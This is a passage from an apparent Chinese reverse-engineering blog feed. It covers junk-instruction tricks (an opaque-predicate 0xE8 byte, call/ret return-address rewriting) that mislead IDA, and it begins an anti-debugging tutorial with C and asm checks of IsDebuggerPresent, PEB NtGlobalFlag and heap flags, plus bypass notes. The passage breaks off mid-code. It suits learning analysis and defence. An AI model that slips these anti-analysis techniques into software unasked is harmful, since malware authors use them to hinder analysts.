srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030211603863_huc23cc312a3844059e36c75b9cf995c65_26582_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030211603863_huc23cc312a3844059e36c75b9cf995c65_26582_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211030211603863"
class="gallery-image"
data-flex-grow="514"
data-flex-basis="1233px"
>&lt;/p>
&lt;p>上图是IDA中反汇编的结果。&lt;/p>
&lt;h3 id="23-构造能欺骗ida的花指令">2.3 构造能欺骗IDA的花指令&lt;/h3>
&lt;p>构造能欺骗IDA的花指令简单的办法就是构造无法被静态分析的恒真/恒假条件。举例来说，&lt;code>LoadLibraryA&lt;/code> 加载失败会返回 &lt;code>NULL&lt;/code>，就可以被用来构造花指令。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="n">LoadLibraryA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;not-exists.dll&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;test %eax,%eax;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">jz next;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">.byte 0xe8;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">next:&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030213109569.png"
width="955"
height="267"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030213109569_huae46ff5cf7f405ad977cb15ab7a51e13_39907_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030213109569_huae46ff5cf7f405ad977cb15ab7a51e13_39907_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211030213109569"
class="gallery-image"
data-flex-grow="357"
data-flex-basis="858px"
>&lt;/p>
&lt;p>可以看到，IDA不能静态分析出&lt;code>LoadLibraryA&lt;/code> 的返回值是 &lt;code>NULL&lt;/code>，顺着 &lt;code>jz&lt;/code> 的 False 分支反汇编时遇到了 &lt;code>0xe8&lt;/code>，于是后续的反汇编结果就完全乱了套。&lt;/p>
&lt;h3 id="24-破坏栈帧分析">2.4 破坏栈帧分析&lt;/h3>
&lt;p>还有一种花指令是通过对 &lt;code>call&lt;/code> 和 &lt;code>ret&lt;/code> 利用来实现破坏栈帧分析。大家都知道 &lt;code>call&lt;/code> 和 &lt;code>ret&lt;/code> 就是 &lt;code>push&lt;/code>+&lt;code>jmp&lt;/code>和&lt;code>pop&lt;/code>+&lt;code>jmp&lt;/code>，如果我们手动在函数里再构造一个假函数，跳转之后修改栈上的返回地址，返回到我们希望继续执行的位置，虽然本质上是个 GOTO 的操作，但 IDA 就会懵圈了。&lt;/p>
&lt;p>一个简单的例子如下，&lt;code>call&lt;/code>跳转到下一行，修改返回地址到 &lt;code>continue&lt;/code> 后又&lt;code>ret&lt;/code>，结果就是在 &lt;code>continue&lt;/code> 这个标签处继续执行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c"> &lt;span class="k">asm&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;call next;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;next:&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;movl $continue,(%esp);&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;ret;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;continue:&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>产生的代码在IDA里分析会出现这样的 &lt;code>sp-analysis failed&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030215415946.png"
width="529"
height="325"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030215415946_hu1b68fd95622716000a3ab92e85a1f3fd_15293_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-07/image-20211030215415946_hu1b68fd95622716000a3ab92e85a1f3fd_15293_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211030215415946"
class="gallery-image"
data-flex-grow="162"
data-flex-basis="390px"
>&lt;/p>
&lt;p>这个思路可以反复嵌套，增加跳转的次数和深度，甚至把正常逻辑隐藏在这种反复跳转中，但从高级语言层面手工加这种花很困难。&lt;/p>
&lt;p>再给一个复杂一些的例子，同样是利用了 &lt;code>call&lt;/code> 和 &lt;code>ret&lt;/code> 来实现花式跳转。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/learning-packer-07/165417l97li97iwq8lf5qz.png"
width="836"
height="381"
srcset="https://nnnewb.github.io/blog/blog/p/learning-packer-07/165417l97li97iwq8lf5qz_hua1e400469607dff71cf186bb43cf99f2_16220_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/learning-packer-07/165417l97li97iwq8lf5qz_hua1e400469607dff71cf186bb43cf99f2_16220_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="img"
class="gallery-image"
data-flex-grow="219"
data-flex-basis="526px"
>&lt;/p>
&lt;p>来自52论坛的：&lt;a class="link" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;amp;tid=1068444&amp;amp;highlight=%BB%A8%D6%B8%C1%EE" target="_blank" rel="noopener"
>一些简单的花指令的解析(含Intel指令集) - 『病毒分析区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn&lt;/a>。&lt;/p>
&lt;p>顺便一提，链接里那个 &lt;code>pop ss&lt;/code> 也很有意思，GrandCrab 的案例也是结合了多种控制流指令来完成跳转，阻碍IDA分析。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>首先，不只是E8，不要局限在这里。所有的多字节指令都可以用来构造花指令。花指令也不只是利用多字节指令干扰反汇编，也能精心伪造控制流对抗分析工具的其他高级分析功能，迫使分析者不能无脑F5读伪代码，消磨分析者的时间、精力、耐心。&lt;/p>
&lt;p>花指令有很多模式，但一个显著特征是 &lt;strong>跳转&lt;/strong>，必须通过跳转指令来实现越过不可执行的花指令，或通过跳转来实现重新解释已经被解释过的指令的一部分，以及通过连续跳转来隐藏真实跳转地址。所以看到莫名其妙地开始跳起来就要警惕了，这会儿很可能正在分析无效的垃圾代码。&lt;/p>
&lt;p>编写花指令的时候应该注意到，花指令对抗的目标不是分析工具，而是分析者。简单地写一个&lt;code>jz&lt;/code>和&lt;code>E8&lt;/code>也许实现了让分析工具出错的目的，但分析者一眼就能看出这是无效代码，基本无法起到对抗作用。&lt;/p>
&lt;p>参考资料：&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://book.douban.com/subject/25868289/" target="_blank" rel="noopener"
>恶意代码分析实战 (豆瓣) (douban.com)&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.cnblogs.com/onetrainee/p/12175257.html" target="_blank" rel="noopener"
>一个利用call+ret修改返回地址的花指令分析 - OneTrainee - 博客园 (cnblogs.com)&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;amp;tid=1068444&amp;amp;highlight=%BB%A8%D6%B8%C1%EE" target="_blank" rel="noopener"
>一些简单的花指令的解析(含Intel指令集) - 『病毒分析区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.intel.com/content/www/us/en/develop/download/intel-64-and-ia-32-architectures-sdm-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html" target="_blank" rel="noopener"
>Combined Volume Set of Intel® 64 and IA-32 Architectures Software Developer’s Manuals&lt;/a>&lt;/li>
&lt;li>[&lt;a class="link" href="https://bbs.pediy.com/thread-113402.htm" target="_blank" rel="noopener"
>原创]汇编指令之OpCode快速入门-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.felixcloutier.com/x86/" target="_blank" rel="noopener"
>x86 and amd64 instruction reference (felixcloutier.com)&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://www.mathemainzel.info/files/x86asmref.html" target="_blank" rel="noopener"
>Intel 80x86 Assembly Language OpCodes (mathemainzel.info)&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://defuse.ca/online-x86-assembler.htm" target="_blank" rel="noopener"
>online x86 disassembler&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.docin.com/p-748789332.html" target="_blank" rel="noopener"
>花指令模糊变换策略研究与实现 - 豆丁网 (docin.com)&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>特别推荐最后这篇论文，我没找到在哪儿能下，就放原链接了。直接百度学术搜花指令也能找到很多有意思的文章（尽管形式化描述的部分基本都没看懂）。&lt;/p>
&lt;p>自动化的加花方式基本要求在汇编层面去重排代码或者插入代码，直接在二进制文件上加花我寻思了一下是蛮难的，主要是正常程序代码段里随便插东西的话，重定位和重新算各种文件字段很麻烦。所以吧&amp;hellip;大概在编译器层面（LLVM？或者对生成的汇编文件下手）才会比较好施展开。&lt;/p></description></item><item><title>加壳原理06：反调试技术入门</title><link>https://nnnewb.github.io/blog/p/learning-packer-06/</link><pubDate>Wed, 27 Oct 2021 19:50:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/learning-packer-06/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/learning-packer-06/cover.jpg" alt="Featured image of post 加壳原理06：反调试技术入门" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>反调试技术，往大了说是用尽一切手段防止运行时对程序的非法篡改和窥视，往小了说就是防调试器。反正反调试这件事和各种技术都能搭点边，什么HOOK啦DLL注入啦。真要给涉及到的各方面都说得头头是道，那我这个菜鸡就不叫菜鸡了。&lt;/p>
&lt;p>反正涉及的各种技术细节吧，将来都会慢慢学到的。也不急于一时。本篇关注的重点还是在导，引入，了解个大概。看看有什么反调试思路，对付这些反调试技术又有什么 bypass 的手段。&lt;/p>
&lt;p>说这么多，其实还是找了篇写得不错的外文文章，抄了然后调试了下案例。&lt;/p>
&lt;h2 id="0x01-反调试思路">0x01 反调试思路&lt;/h2>
&lt;p>首先概述一下本篇主要的反调试思路。&lt;/p>
&lt;h3 id="11-系统api或数据结构">1.1 系统API或数据结构&lt;/h3>
&lt;p>操作系统提供了一些调试标志位，调试器启动的进程会有标识。调试器也可能会为了提供更好的调试体验，修改一些参数，让我们有迹可循。&lt;/p>
&lt;ol>
&lt;li>&lt;code>PEB-&amp;gt;BeingDebugged&lt;/code>和&lt;code>IsDebuggerPresent&lt;/code>&lt;/li>
&lt;li>&lt;code>PEB-&amp;gt;NtGlobalFlag&lt;/code>&lt;/li>
&lt;li>&lt;code>PEB-&amp;gt;HEAP-&amp;gt;Flags&lt;/code>和&lt;code>PEB-&amp;gt;HEAP-&amp;gt;ForceFlags&lt;/code>&lt;/li>
&lt;li>&lt;code>CheckRemoteDebuggerPresent&lt;/code>&lt;/li>
&lt;li>&lt;code>NtQueryInformationProcess&lt;/code>
&lt;ol>
&lt;li>&lt;code>ProcessDebugPort&lt;/code>&lt;/li>
&lt;li>&lt;code>ProcessDebugObjectHandle&lt;/code>&lt;/li>
&lt;li>&lt;code>ProcessDebugFlags&lt;/code>&lt;/li>
&lt;li>&lt;code>ProcessBasicInformation&lt;/code>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>&lt;code>NtSetInformationThread&lt;/code>和&lt;code>NtCreateThreadEx&lt;/code>
&lt;ol>
&lt;li>利用 &lt;code>HideFromDebugger&lt;/code> 标志位来对调试器隐藏自身。&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h3 id="12-sehveh">1.2 SEH、VEH&lt;/h3>
&lt;p>总的来说，利用 SEH 和 VEH 机制，尝试抛出一些会被调试器处理的中断或异常，同时自己挂一个处理函数，如果异常被调试器捕获了，那自己挂的异常处理函数就不会被调用，借此判断是否有调试器正在调试程序。&lt;/p>
&lt;ol>
&lt;li>&lt;code>TF&lt;/code>标志位和&lt;code>INT 1&lt;/code>中断&lt;/li>
&lt;li>&lt;code>INT 3&lt;/code> 中断和 SEH 处理函数，&lt;code>__try __except&lt;/code> 或 MinGW 的 &lt;code>__try1 __except1&lt;/code>，顺便一提我的SEH实验没成功。但是 VEH 基本没问题。&lt;/li>
&lt;li>&lt;code>DBG_PRINTEXCEPTION_WIDE_C&lt;/code>和&lt;code>DBG_PRINTEXCEPTION_W&lt;/code>，Windows 10 &lt;code>OutputDebugString&lt;/code> 利用了这个 Exception 来抛出调试字符串。&lt;/li>
&lt;li>&lt;code>EXCEPTION_INVALID_HANDLE&lt;/code>&lt;/li>
&lt;/ol>
&lt;h3 id="13-调试寄存器">1.3 调试寄存器&lt;/h3>
&lt;p>&lt;code>GetThreadContext&lt;/code> 获取当前上下文，判断 &lt;code>Dr0&lt;/code>-&lt;code>Dr3&lt;/code>寄存器的值。&lt;/p>
&lt;h3 id="14-完整性校验">1.4 完整性校验&lt;/h3>
&lt;p>原理是调试器通过临时修改断点处指令为中断来取得程序控制权，可以用CRC校验，或者更简单点，直接逐字节求和，判断代码是否被篡改。&lt;/p>
&lt;h2 id="0x02-系统api方式">0x02 系统API方式&lt;/h2>
&lt;h3 id="21-isdebuggerpresent">2.1 IsDebuggerPresent&lt;/h3>
&lt;p>首先出场的就是 &lt;code>IsDebuggerPresent&lt;/code> 这个 API 了，文档&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent" target="_blank" rel="noopener"
>可以在这里&lt;/a>找到。简要概述一下这个接口，微软的描述是此函数允许应用程序确定自己是否正在被调试，并依此改变行为。例如通过&lt;code>OutputDebugString&lt;/code>函数提供更多调试信息。&lt;/p>
&lt;p>微软的本意应该是一个调试开关式的东西，正经写过工作代码应该知道代码里加个调试开关方便在出问题的时候拿详细日志是很有用很方便的，同时也能在不需要调试的时候也不会让程序不会损失太多性能。比起编译期的调试开关&lt;code>_DEBUG&lt;/code>宏之类的会更灵活一些。&lt;/p>
&lt;p>扯远了。总之，这个函数没参数，返回&lt;code>BOOL&lt;/code>，案例很好写。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;debugapi.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_isDebuggerPresent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">IsDebuggerPresent&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;IsDebuggerPresent&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>就是这样。&lt;/p>
&lt;p>&lt;code>IsDebuggerPresent&lt;/code> 这个 API 的实现方式是从 PEB &lt;em>Process Environment Block&lt;/em> 读取 &lt;code>BeingDebugged&lt;/code> 字段。随便什么调试器跳转过去就能看到这样的实现代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">dword&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">fs&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="mi">0x30&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">movzx&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">byte&lt;/span> &lt;span class="no">ptr&lt;/span> &lt;span class="no">ds&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="no">eax&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0x2&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">ret&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>fs:[0]&lt;/code>是 TEB &lt;em>Thread Environment Block&lt;/em> 结构的地址，其中&lt;code>fs:[0x30]&lt;/code> 这个偏移是 PEB 指针，第一行的意思是将 PEB 指针赋值给 eax 寄存器。&lt;/p>
&lt;p>第二行就是从 PEB 结构的 0x2 偏移处，也就是 &lt;code>BeingDebugged&lt;/code> 字段，取 1 字节，赋值到 eax 。&lt;/p>
&lt;p>第三行就是返回了，没有参数和局部变量所以也没平栈，无论 &lt;code>__cdecl&lt;/code> 还是 &lt;code>__stdcall&lt;/code> 都是在 &lt;code>eax&lt;/code> 寄存器保存返回值。&lt;/p>
&lt;p>从&lt;a class="link" href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block" target="_blank" rel="noopener"
>wiki&lt;/a> 和 &lt;a class="link" href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FTEB.html" target="_blank" rel="noopener"
>NTAPI UNDOCUMENTED FUNCTIONS&lt;/a> 查询到的文档都能看到 PEB 结构的内存布局。&lt;/p>
&lt;p>想要 bypass 这种检查就非常容易，修改 PEB 结构中的 &lt;code>BeingDebugged&lt;/code> 字段值为 0 就完事了。&lt;/p>
&lt;h3 id="22-ntglobalflag">2.2 NtGlobalFlag&lt;/h3>
&lt;p>&lt;code>NtGlobalFlag&lt;/code> 也是一个 PEB 的字段，但是在微软官方的 PEB 结构文档和定义里没有给出这个字段（在 Reserved 里）。查阅上面提到的文档或者用 WinDbg 的 &lt;code>dt&lt;/code> 命令都可以查到。&lt;/p>
&lt;p>当这个字段包含特定标志位（&lt;code>0x20 | 0x40&lt;/code>，分别是 &lt;strong>FLG_HEAP_ENABLE_TAIL_CHECK&lt;/strong> 和 &lt;strong>FLG_HEAP_ENABLE_FREE_CHECK&lt;/strong>）的时候提示有调试器存在（&lt;a class="link" href="https://www.geoffchappell.com/studies/windows/win32/ntdll/api/rtl/regutil/getntglobalflags.htm" target="_blank" rel="noopener"
>Geoff Chappell, Software Analyst，RtlGetNtGlobalFlags()&lt;/a>，没微软的文档）。&lt;/p>
&lt;p>这里给出 WinDbg 查到的字段偏移。微软商店里的 WinDbg Preview 也是一样的。关于 &lt;code>dt&lt;/code> 命令可以用 &lt;code>.hh dt&lt;/code> 来查阅命令的文档，&lt;code>?&lt;/code> 来查阅可用命令，或者直接点上面的帮助。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">0:000&amp;gt; dt _peb NtGlobalFlag @$peb
ntdll!_PEB
+0x068 NtGlobalFlag : 0x70
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到偏移是 &lt;code>0x68&lt;/code>，WinDbg 中标志位的值是 &lt;code>x70&lt;/code>，符合上面所说的 &lt;code>0x20|0x40&lt;/code>。接下来尝试实现一下。首先因为我用的 MinGW 所以需要写两句汇编去取PEB指针。（用的 nasm，gcc 的内联汇编语法太怪了）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">section&lt;/span> &lt;span class="no">.text&lt;/span>
&lt;span class="nf">global&lt;/span> &lt;span class="no">_GetPEB&lt;/span>
&lt;span class="nl">_GetPEB:&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,[&lt;/span>&lt;span class="no">fs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">retn&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再具体实现。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_RtlGetNtGlobalFlags&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 两种方式，直接读内存或者用undocumented接口
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">PPEB&lt;/span> &lt;span class="n">peb&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetPEB&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PULONG&lt;/span>&lt;span class="p">)((&lt;/span>&lt;span class="n">PBYTE&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">peb&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x68&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x20&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mh">0x40&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;PEB-&amp;gt;NtGlobalFlag&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 或者...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">HMODULE&lt;/span> &lt;span class="n">ntdll&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadLibraryA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ntdll.dll&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">FARPROC&lt;/span> &lt;span class="n">proc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ntdll&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;RtlGetNtGlobalFlags&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">typedef&lt;/span> &lt;span class="n">ULONG&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">RtlGetNtGlobalFlags_t&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(((&lt;/span>&lt;span class="n">RtlGetNtGlobalFlags_t&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">)()&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x20&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mh">0x40&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;RtlGetNtGlobalFlags&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>差别不大，可以根据需要选择其一。编译后不使用调试器打开则不会触发反调试代码。&lt;/p>
&lt;p>bypass 这个检查也很容易，因为标志位都在被调试进程的地址空间里，直接改掉就行了。&lt;/p>
&lt;h3 id="23-heap-flags">2.3 HEAP-&amp;gt;Flags&lt;/h3>
&lt;p>PEB 结构中还有个指向当前堆信息结构的指针，&lt;code>ProcessHeap&lt;/code>。可以用 WinDbg 的 &lt;code>dt&lt;/code> 命令查看。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">0:000&amp;gt; dt _peb processheap @$peb
ntdll!_PEB
+0x018 ProcessHeap : 0x012d0000 Void
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而这个 heap 结构的也同样可以用 &lt;code>dt&lt;/code> 命令查看。我们关注的是 heap 结构中的 &lt;code>Flags&lt;/code> 和 &lt;code>ForceFlags&lt;/code> 字段。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">0:000&amp;gt; dt _heap flags 0x012d0000
ntdll!_HEAP
+0x040 Flags : 0x40000062
0:000&amp;gt; dt _heap forceflags 0x012d0000
ntdll!_HEAP
+0x044 ForceFlags : 0x40000060
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当 Flags 没有 &lt;code>HEAP_GROWABLE&lt;/code> 标志位，或 &lt;code>ForceFlags&lt;/code> 不为零的时候，则可能存在调试器。同样的， 没有官方的文档，只能说逆向出这些东西的大佬真是太强啦。关于 Flags 谷歌了一下，发现在 &lt;a class="link" href="https://ctf-wiki.org/reverse/windows/anti-debug/heap-flags/#flags" target="_blank" rel="noopener"
>CTF Wiki&lt;/a> 有比较详细的说明。我搬一部分过来。&lt;/p>
&lt;blockquote>
&lt;p>在所有版本的 Windows 中, &lt;code>Flags&lt;/code>字段的值正常情况都设为&lt;code>HEAP_GROWABLE(2)&lt;/code>, 而&lt;code>ForceFlags&lt;/code>字段正常情况都设为&lt;code>0&lt;/code>. 然而对于一个 32 位进程 (64 位程序不会有此困扰), 这两个默认值, 都取决于它的宿主进程(host process) 的 &lt;a class="link" href="https://msdn.microsoft.com/en-us/library/ms933120.aspx" target="_blank" rel="noopener"
>&lt;code>subsystem&lt;/code>&lt;/a>版本 (这里不是指所说的比如 win10 的 linux 子系统). 只有当&lt;code>subsystem&lt;/code>在&lt;code>3.51&lt;/code>及更高的版本, 字段的默认值才如前所述. 如果是在&lt;code>3.10-3.50&lt;/code>版本之间, 则两个字段的&lt;code>HEAP_CREATE_ALIGN_16 (0x10000)&lt;/code>都会被设置. 如果版本低于&lt;code>3.10&lt;/code>, 那么这个程序文件就根本不会被运行.&lt;/p>
&lt;p>如果某操作将&lt;code>Flags&lt;/code>和&lt;code>ForgeFlags&lt;/code>字段的值分别设为&lt;code>2&lt;/code>和&lt;code>0&lt;/code>, 但是却未对&lt;code>subsystem&lt;/code>版本进行检查, 那么就可以表明该动作是为了隐藏调试器而进行的.&lt;/p>
&lt;/blockquote>
&lt;p>接下来给出案例代码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_PEB_HeapFlags&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">PPEB&lt;/span> &lt;span class="n">peb&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetPEB&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="n">PVOID&lt;/span> &lt;span class="n">heap&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PDWORD&lt;/span>&lt;span class="p">)((&lt;/span>&lt;span class="n">PBYTE&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">peb&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x18&lt;/span>&lt;span class="p">);&lt;/span>
